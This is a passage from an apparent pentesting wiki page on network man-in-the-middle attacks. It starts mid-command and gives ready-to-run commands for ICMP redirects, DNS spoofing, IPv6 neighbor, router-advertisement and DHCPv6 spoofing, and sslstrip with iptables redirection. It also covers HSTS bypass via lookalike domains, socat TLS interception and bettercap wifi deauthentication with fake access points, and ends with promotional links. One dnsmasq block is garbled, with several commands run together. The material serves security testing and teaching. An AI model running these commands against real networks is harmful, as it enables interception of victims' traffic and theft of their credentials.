hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```

### DNS Spoofing

The attacker will resolve some (or all) the domains that the victim ask for.

```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```

**Configure own DNS with dnsmasq**

```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```

### Local Gateways

Multiple routes to systems and networks often exist. Upon building a list of MAC addresses within the local network, use _gateway-finder.py_ to identify hosts that support IPv4 forwarding.

```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/) 
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```

### [Spoofing LLMNR, NBT-NS, and mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Microsoft systems use Link-Local Multicast Name Resolution (LLMNR) and the NetBIOS Name Service (NBT-NS) for local host resolution when DNS lookups fail. Apple Bonjour and Linux zero-configuration implementations use Multicast DNS (mDNS) to discover systems within a network. These protocols are unauthenticated and broadcast messages over UDP; thus, attackers can exploit them to direct users to malicious services.

You can impersonate services that are searched by hosts using Responder to send fake responses.\
Read here more information about [how to Impersonate services with Responder](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Many browsers use Web Proxy Auto-Discovery (WPAD) to load proxy settings from the network. A WPAD server provides client proxy settings via a particular URL (e.g., [http://wpad.example.org/wpad.dat](http://wpad.example.org/wpad.dat)) upon being identified through any of the following:

* DHCP, using a code 252 entry[34](https://learning.oreilly.com/library/view/Network+Security+Assessment,+3rd+Edition/9781491911044/ch05.html#ch05fn41)
* DNS, searching for the _wpad_ hostname in the local domain
* Microsoft LLMNR and NBT-NS (in the event of DNS lookup failure)

Responder automates the WPAD attack—running a proxy and directing clients to a malicious WPAD server via DHCP, DNS, LLMNR, and NBT-NS.\
Read here more information about [how to Impersonate services with Responder](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing SSDP and UPnP devices](spoofing-ssdp-and-upnp-devices.md)

You can offer different services in the network to try to **trick a user** to enter some **plain-text credentials**. **More information about this attack in** [**Spoofing SSDP and UPnP Devices**](spoofing-ssdp-and-upnp-devices.md)**.**

### IPv6 Neighbor Spoofing

This attack is very similar to ARP Spoofing but in the IPv6 world. You can get the victim think that the IPv6 of the GW has the MAC of the attacker.

```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```

### IPv6 Router Advertisement Spoofing/Flooding

Some OS configure by default the gateway from the RA packets sent in the network. To declare the attacker as IPv6 router you can use:

```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```

### IPv6 DHCP spoofing

By default some OS try to configure the DNS reading a DHCPv6 packet in the network. Then, an attacker could send a DHCPv6 packet to configure himself as DNS. The DHCP also provides an IPv6 to the victim.

```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```

### HTTP (fake page and JS code injection)

## Internet Attacks

### sslStrip

Basically what this attack does is, in case the **user** try to **access** a **HTTP** page that is **redirecting** to the **HTTPS** version. **sslStrip** will **maintain** a **HTTP connection with** the **client and** a **HTTPS connection with** the **server** so it ill be able to **sniff** the connection in **plain text**.

```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```

More info [here](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).

### sslStrip+ and dns2proxy for bypassing HSTS

The **difference** between **sslStrip+ and dns2proxy** against **sslStrip** is that they will **redirect** for example _**www.facebook.com**_ **to** _**wwww.facebook.com**_ (note the **extra** "**w**") and will set the **address of this domain as the attacker IP**. This way, the **client** will **connect** to _**wwww.facebook.com**_ **(the attacker)** but behind the scenes **sslstrip+** will **maintain** the **real connection** via https with **www.facebook.com**.

The **goal** of this technique is to **avoid HSTS** because _**wwww**.facebook.com_ **won't** be saved in the **cache** of the browser, so the browser will be tricked to perform **facebook authentication in HTTP**.\
Note that in order to perform this attack the victim has to try to access initially to [http://www.faceook.com](http://www.faceook.com) and not https. This can be done modifying the links inside an http page.

More info [here](https://www.bettercap.org/legacy/#hsts-bypass), [here](https://www.slideshare.net/Fatuo\_\_/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) and [here](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly).

**sslStrip or sslStrip+ doesn;t work anymore. This is because there are HSTS rules presaved in the browsers, so even if it's the first time that a user access an "important" domain he will access it via HTTPS. Also, notice that the presaved rules and other generated rules can use the flag** [**`includeSubdomains`**](https://hstspreload.appspot.com) **so the** _**wwww.facebook.com**_ **example from before won't work anymore as** _**facebook.com**_ **uses HSTS with `includeSubdomains`.**

TODO: easy-creds, evilgrade, metasploit, factory

## TCP listen in port

```
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```

## TCP + SSL listen in port

#### Generate keys and self-signed certificate

```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```

#### Listen using certificate

```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```

#### Listen using certificate and redirect to the hosts

```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```

Some times, if the client checks that the CA is a valid one, you could **serve a certificate of other hostname signed by a CA**.\
Another interesting test, is to serve a c**ertificate of the requested hostname but self-signed**.

Other things to test is to try to sign the certificate with a valid certificate that it is not a valid CA. Or to use the valid public key, force to use an algorithm as diffie hellman (one that do not need to decrypt anything with the real private key) and when the client request a probe of the real private key (like a hash) send a fake probe and expect that the client does not check this.

## Bettercap

```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events 
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```

### Active Discovery Notes

Take into account that when a UDP packet is sent to a device that do not have the requested port an ICMP (Port Unreachable) is sent.

### **ARP discover**

ARP packets are used to discover wich IPs are being used inside the network. The PC has to send a request for each possible IP address and only the ones that are being used will respond.

### **mDNS (multicast DNS)**

Bettercap send a MDNS request (each X ms) asking for **\_services\_.dns-sd.\_udp.local** the machine that see this paket usually answer this request. Then, it only searchs for machine answering to "services".

**Tools**

* Avahi-browser (--all)
* Bettercap (net.probe.mdns)
* Responder

### **NBNS (NetBios Name Server)**

Bettercap broadcast packets to the port 137/UDP asking for the name "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA".

### **SSDP (Simple Service Discovery Protocol)**

Bettercap broadcast SSDP packets searching for all kind of services (UDP Port 1900).

### **WSD (Web Service Discovery)**

Bettercap broadcast WSD packets searching for services (UDP Port 3702).

## References

* [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Bug bounty tip**: **sign up** for **Intigriti**, a premium **bug bounty platform created by hackers, for hackers**! Join us at [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) today, and start earning bounties up to **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
